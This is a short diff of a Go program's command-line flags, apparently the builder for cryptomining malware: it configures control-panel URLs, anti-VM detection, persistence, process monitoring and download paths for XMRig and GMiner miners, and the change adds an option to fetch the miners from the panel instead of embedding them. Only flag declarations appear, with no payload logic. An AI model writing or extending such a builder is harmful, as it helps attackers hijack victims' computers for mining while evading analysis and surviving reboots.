@@ -19,14 +19,15 @@ var reader *bufio.Reader
 
 // Command-line flags
 var (
-	panelURLFlag    = flag.String("panel-urls", "", "Panel URL(s) separated by commas")
-	monitoringFlag  = flag.Bool("monitoring", false, "Enable process monitoring")
-	debugFlag       = flag.Bool("debug", false, "Enable debug console")
-	antiVMFlag      = flag.Bool("antivm", false, "Enable anti-VM detection")
-	persistenceFlag = flag.Bool("persistence", false, "Enable persistence")
-	outputFlag      = flag.String("output", "", "Output directory for the built binary")
-	xmrigURLFlag    = flag.String("xmrig-url", "http://127.0.0.1:8080/api/miner/xmrig", "Download URL for XMRig miner")
-	gminerURLFlag   = flag.String("gminer-url", "http://127.0.0.1:8080/api/miner/gminer", "Download URL for GMiner miner")
+	panelURLFlag     = flag.String("panel-urls", "", "Panel URL(s) separated by commas")
+	monitoringFlag   = flag.Bool("monitoring", false, "Enable process monitoring")
+	debugFlag        = flag.Bool("debug", false, "Enable debug console")
+	antiVMFlag       = flag.Bool("antivm", false, "Enable anti-VM detection")
+	persistenceFlag  = flag.Bool("persistence", false, "Enable persistence")
+	remoteMinersFlag = flag.Bool("remote-miners", false, "Download miners from panel instead of embedding")
+	outputFlag       = flag.String("output", "", "Output directory for the built binary")
+	xmrigURLFlag     = flag.String("xmrig-url", "/resources/xmrig", "URL path for XMRig download (relative to panel URL)")
+	gminerURLFlag    = flag.String("gminer-url", "/resources/gminer", "URL path for GMiner download (relative to panel URL)")
 )
 
 func init() {
